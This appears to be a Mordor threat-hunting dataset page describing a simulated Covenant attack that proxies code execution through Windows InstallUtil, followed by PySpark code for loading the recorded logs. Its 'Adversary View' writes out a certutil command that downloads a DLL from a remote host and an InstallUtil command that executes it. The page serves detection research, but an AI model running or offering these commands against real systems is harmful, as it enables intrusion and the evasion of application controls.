# Covenant InstallUtil

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-191027223020 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/10/27 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | Interactive Session |
| Simulation Tool   | Remote Desktop Protocol |
| Simulation Script | None |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/covenant_installutil.tar.gz |

## Dataset Description
This dataset represents adversaries proxying execution of code through InstallUtil, a trusted Windows utility.

## Adversary View
```
certutil.exe -urlcache -split -f http://172.18.39.8/util.dll C:\ProgramData\util.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /u c:\ProgramData\util.dll
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/covenant_installutil.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        